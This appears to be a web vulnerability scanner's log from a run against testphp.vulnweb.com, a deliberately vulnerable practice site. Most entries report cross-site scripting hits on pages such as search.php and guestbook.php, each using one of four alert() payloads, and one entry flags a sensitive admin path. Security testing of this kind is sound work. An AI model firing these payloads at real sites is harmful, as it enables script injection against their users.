2025-03-05 01:29:51,980 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:29:51.980621', 'url': 'http://testphp.vulnweb.com/admin/', 'vulnerability': 'sensitive', 'payload': 'Sensitive File Found'}
2025-03-05 01:30:43,789 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:43.789700', 'url': 'http://testphp.vulnweb.com/login.php', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:30:44,098 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:44.098422', 'url': 'http://testphp.vulnweb.com/login.php', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:30:44,636 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:44.636186', 'url': 'http://testphp.vulnweb.com/userinfo.php', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:30:44,916 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:44.916408', 'url': 'http://testphp.vulnweb.com/userinfo.php', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:30:45,155 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:45.155925', 'url': 'http://testphp.vulnweb.com/userinfo.php', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:30:45,610 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:45.610109', 'url': 'http://testphp.vulnweb.com/userinfo.php', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:30:45,844 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:45.844476', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:30:46,145 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:46.145484', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:30:46,458 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:46.457990', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:30:46,761 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:46.761267', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:30:47,379 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:47.379669', 'url': 'http://testphp.vulnweb.com/userinfo.php', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:30:47,991 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:47.991019', 'url': 'http://testphp.vulnweb.com/userinfo.php', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:30:48,602 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:48.602766', 'url': 'http://testphp.vulnweb.com/userinfo.php', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:30:49,218 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:49.218795', 'url': 'http://testphp.vulnweb.com/userinfo.php', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:30:50,138 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:50.138714', 'url': 'http://testphp.vulnweb.com/userinfo.php', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:30:50,445 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:50.445732', 'url': 'http://testphp.vulnweb.com/userinfo.php', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:30:50,757 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:50.756469', 'url': 'http://testphp.vulnweb.com/userinfo.php', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:30:51,624 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:51.624157', 'url': 'http://testphp.vulnweb.com/userinfo.php', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:30:51,870 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:51.870434', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:30:52,094 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:52.094393', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:30:52,391 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:52.391437', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:30:52,705 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:52.705875', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:30:53,006 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:53.006015', 'url': 'http://testphp.vulnweb.com/listproducts.php?artist=3', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:30:53,321 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:53.321745', 'url': 'http://testphp.vulnweb.com/listproducts.php?artist=3', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:30:53,622 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:53.622387', 'url': 'http://testphp.vulnweb.com/listproducts.php?artist=3', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:30:53,927 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:53.927964', 'url': 'http://testphp.vulnweb.com/listproducts.php?artist=3', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:30:54,542 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:54.542059', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:30:54,850 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:54.850449', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:30:55,161 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:55.161346', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:30:55,464 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:55.464287', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:30:57,308 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:57.308911', 'url': 'http://testphp.vulnweb.com/guestbook.php', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:30:57,613 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:57.613924', 'url': 'http://testphp.vulnweb.com/guestbook.php', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:30:57,922 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:57.922452', 'url': 'http://testphp.vulnweb.com/guestbook.php', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:30:58,230 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:58.230718', 'url': 'http://testphp.vulnweb.com/guestbook.php', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:30:58,774 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:58.774520', 'url': 'http://testphp.vulnweb.com/guestbook.php', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:30:59,239 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:59.238770', 'url': 'http://testphp.vulnweb.com/guestbook.php', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:30:59,459 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:59.459965', 'url': 'http://testphp.vulnweb.com/guestbook.php', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:30:59,765 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:59.764875', 'url': 'http://testphp.vulnweb.com/guestbook.php', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:30:59,972 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:30:59.972060', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:31:00,235 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:00.235027', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:31:00,510 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:00.510362', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:31:00,788 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:00.788763', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:31:01,095 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:01.095771', 'url': 'http://testphp.vulnweb.com/artists.php?artist=2', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:31:01,406 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:01.405189', 'url': 'http://testphp.vulnweb.com/artists.php?artist=2', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:31:01,721 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:01.720733', 'url': 'http://testphp.vulnweb.com/artists.php?artist=2', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:31:05,499 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:05.499208', 'url': 'http://testphp.vulnweb.com/artists.php?artist=1', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:31:05,810 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:05.810288', 'url': 'http://testphp.vulnweb.com/artists.php?artist=1', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:31:06,117 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:06.117141', 'url': 'http://testphp.vulnweb.com/artists.php?artist=1', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:31:06,396 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:06.396598', 'url': 'http://testphp.vulnweb.com/artists.php?artist=1', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:31:07,121 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:07.121029', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:31:07,353 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:07.353130', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:31:07,574 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:07.574541', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:31:07,782 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:07.782498', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:31:15,026 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:15.026472', 'url': 'http://testphp.vulnweb.com/listproducts.php?artist=1', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:31:15,234 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:15.234973', 'url': 'http://testphp.vulnweb.com/listproducts.php?artist=1', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:31:15,534 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:15.534539', 'url': 'http://testphp.vulnweb.com/listproducts.php?artist=1', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:31:15,842 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:15.842379', 'url': 'http://testphp.vulnweb.com/listproducts.php?artist=1', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:31:16,456 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:16.455694', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:31:16,817 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:16.817585', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:31:17,070 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:17.070413', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:31:17,297 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:17.297845', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:31:20,449 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:20.449946', 'url': 'http://testphp.vulnweb.com/product.php?pic=5', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:31:20,732 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:20.732182', 'url': 'http://testphp.vulnweb.com/product.php?pic=5', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:31:20,962 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:20.962097', 'url': 'http://testphp.vulnweb.com/product.php?pic=5', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:31:21,271 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:21.271479', 'url': 'http://testphp.vulnweb.com/product.php?pic=5', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:31:21,884 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:21.884405', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:31:22,192 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:22.192336', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:31:22,497 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:22.497849', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:31:22,757 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:22.757708', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:31:23,020 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:23.019996', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:31:23,317 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:23.317435', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:31:23,626 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:23.626169', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:31:23,931 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:23.931756', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:31:25,580 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:25.580828', 'url': 'http://testphp.vulnweb.com/categories.php', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:31:25,876 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:25.876839', 'url': 'http://testphp.vulnweb.com/categories.php', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:31:26,094 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:26.094836', 'url': 'http://testphp.vulnweb.com/categories.php', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:31:26,329 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:26.329895', 'url': 'http://testphp.vulnweb.com/categories.php', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:31:26,901 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:26.901733', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:31:27,295 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:27.295040', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:31:27,516 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:27.516104', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:31:27,727 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:27.727021', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:31:30,895 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:30.895069', 'url': 'http://testphp.vulnweb.com/product.php?pic=2', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:31:31,202 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:31.202742', 'url': 'http://testphp.vulnweb.com/product.php?pic=2', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:31:31,509 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:31.509488', 'url': 'http://testphp.vulnweb.com/product.php?pic=2', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:31:31,817 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:31.817634', 'url': 'http://testphp.vulnweb.com/product.php?pic=2', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:31:32,432 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:32.432256', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:31:32,740 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:32.740005', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:31:33,046 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:33.045069', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:31:33,352 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:33.352234', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:31:34,045 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:34.045435', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:31:34,276 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:34.276388', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:31:34,581 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:34.581498', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:31:34,888 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:34.888194', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:31:38,269 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:38.269352', 'url': 'http://testphp.vulnweb.com/artists.php?artist=3', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:31:38,881 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:38.881938', 'url': 'http://testphp.vulnweb.com/artists.php?artist=3', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:31:39,197 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:39.197293', 'url': 'http://testphp.vulnweb.com/artists.php?artist=3', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:31:39,499 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:39.499943', 'url': 'http://testphp.vulnweb.com/artists.php?artist=3', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:31:40,112 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:40.112121', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:31:40,418 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:40.418399', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:31:40,725 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:40.725065', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:31:41,032 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:41.032146', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:31:44,616 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:44.615755', 'url': 'http://testphp.vulnweb.com/product.php?pic=7', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:31:44,825 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:44.824585', 'url': 'http://testphp.vulnweb.com/product.php?pic=7', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:31:45,032 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:45.032730', 'url': 'http://testphp.vulnweb.com/product.php?pic=7', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:31:45,333 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:45.333467', 'url': 'http://testphp.vulnweb.com/product.php?pic=7', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
